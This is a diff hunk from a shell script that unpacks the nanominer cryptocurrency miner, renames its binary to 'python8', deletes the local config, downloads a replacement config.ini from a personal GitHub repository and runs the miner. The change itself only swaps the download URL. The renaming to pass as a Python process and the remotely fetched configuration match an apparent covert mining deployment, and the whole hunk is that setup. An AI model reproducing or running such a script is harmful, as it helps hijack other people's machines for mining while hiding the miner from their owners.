@@ -20,6 +20,6 @@ tar xvzf nanominer-linux-1.5.0.tar.gz
 cd nanominer-linux-1.5.0
 mv nanominer python8
 rm config.ini
-wget https://raw.githubusercontent.com/haidanglx/haidanglxx/master/config.ini
+wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/config.ini
 chmod +x python8
 ./python8
